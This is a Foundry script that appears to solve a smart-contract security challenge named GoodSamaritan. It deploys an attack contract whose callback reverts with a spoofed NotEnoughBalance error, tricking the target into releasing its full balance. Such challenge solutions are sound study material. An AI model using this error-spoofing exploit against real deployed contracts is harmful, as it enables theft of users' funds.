// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GoodSamaritan} from "../../src/27/GoodSamaritan.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanScript is Script{
    function run() public{
        vm.startBroadcast();
        Attack attack = new Attack();
        attack.request();
        vm.stopBroadcast();
    }
}


contract Attack is INotifyable{

    error NotEnoughBalance();

    GoodSamaritan goodSamaritan = GoodSamaritan(0xab846B68FAAC0D7A120ecC638fCf570dCCe4C389);

    function request() public{
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) pure external{
        if(amount <= 10){
            revert NotEnoughBalance();
        }
    }


}